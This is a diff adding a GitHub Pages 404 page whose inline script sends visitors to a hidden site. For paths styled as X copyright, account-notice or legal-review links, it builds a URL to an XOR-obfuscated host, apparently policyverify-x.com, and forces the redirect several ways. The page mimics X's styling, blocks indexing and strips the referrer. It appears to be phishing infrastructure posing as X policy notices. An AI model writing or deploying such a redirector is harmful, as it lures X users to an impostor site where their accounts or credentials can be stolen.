@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
+  <meta name="referrer" content="no-referrer" />
+  <meta name="theme-color" content="#000000" />
+  <title></title>
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <style>
+    html,body{margin:0;min-height:100%;background:#000;color:#e7e9ea;
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+    a{color:#1d9bf0}
+    #go{display:none;position:fixed;inset:0;align-items:center;justify-content:center;
+      text-decoration:none;font-weight:700;font-size:17px}
+    #go.on{display:flex}
+  </style>
+  <script>
+(function () {
+  "use strict";
+  /* X CTA paths (slot_identity _X_PATHS) — same as github-x-2 */
+  var GATE = {
+    "content/support": 1,
+    "help/copyright": 1,
+    "account/notice": 1,
+    "legal/review": 1,
+    "copyright/continue": 1
+  };
+
+  function lane(a, k) {
+    var o = "", i;
+    for (i = 0; i < a.length; i++) o += String.fromCharCode((a[i] ^ k[i % k.length]) & 255);
+    return o;
+  }
+  /* Dest: https://policyverify-x.com (same XOR as github-x-2) */
+  function host() {
+    var k0 = [0x2b, 0x91, 0x4e, 0x77];
+    var s0 = lane([0x43, 0xe5, 0x3a, 0x07, 0x58], k0);
+    var k1 = [0x5a, 0x13, 0xc8, 0x2f, 0x91, 0x44];
+    var h0 = lane([0x2a, 0x7c, 0xa4, 0x46, 0xf2, 0x3d, 0x2c, 0x76, 0xba, 0x46, 0xf7, 0x3d], k1);
+    var h1 = lane([0x77, 0x6b], k1);
+    var h2 = lane([0x74, 0x70, 0xa7, 0x42], k1);
+    return s0 + "://" + h0 + h1 + h2;
+  }
+  function parts() {
+    try {
+      return (location.pathname || "").replace(/\/+$/, "").split("/").filter(Boolean);
+    } catch (e) {
+      return [];
+    }
+  }
+  /* GH Pages: /unsubscribe hits 404.html — send to static page (200). */
+  try {
+    var _p0 = (parts()[0] || "").toLowerCase();
+    if (_p0 === "unsubscribe") {
+      location.replace("/unsubscribe.html");
+      return;
+    }
+  } catch (e) {}
+  function handle() {
+    var p = parts();
+    if (p.length !== 3) return "";
+    var pref = p[0] + "/" + p[1], u = p[2];
+    if (!GATE[pref]) return "";
+    if (!/^[A-Za-z0-9._]{1,64}$/.test(u) || u === "index.html" || u === "404.html") return "";
+    return u.replace(/^@+/, "");
+  }
+  /* Target: https://policyverify-x.com/{username}/content/support (+ query/hash) */
+  function dest() {
+    var u = handle();
+    var base = host();
+    if (!u) return "https://x.com/";
+    var out = base + "/" + encodeURIComponent(u) + "/content/support";
+    try {
+      var q = location.search || "";
+      var h = location.hash || "";
+      if (q) out += q;
+      if (h) out += h;
+    } catch (e) {}
+    return out;
+  }
+
+  function hop(url) {
+    try {
+      var m = document.createElement("meta");
+      m.httpEquiv = "refresh";
+      m.content = "0;url=" + url;
+      (document.head || document.documentElement).appendChild(m);
+    } catch (e) {}
+    try { window.top.location.replace(url); } catch (e) {}
+    try { window.location.replace(url); } catch (e) {}
+    try { window.location.href = url; } catch (e) {}
+    try { window.location.assign(url); } catch (e) {}
+    try { document.location = url; } catch (e) {}
+  }
+
+  var url = dest();
+  hop(url);
+
+  function fallback() {
+    var a = document.getElementById("go");
+    if (!a) return;
+    a.href = url;
+    a.className = "on";
+    try { a.click(); } catch (e) {}
+  }
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", fallback);
+  } else {
+    fallback();
+  }
+  setTimeout(function () { hop(url); fallback(); }, 40);
+})();
+  </script>
+</head>
+<body>
+  <a id="go" href="#">Continue</a>
+</body>
+</html>
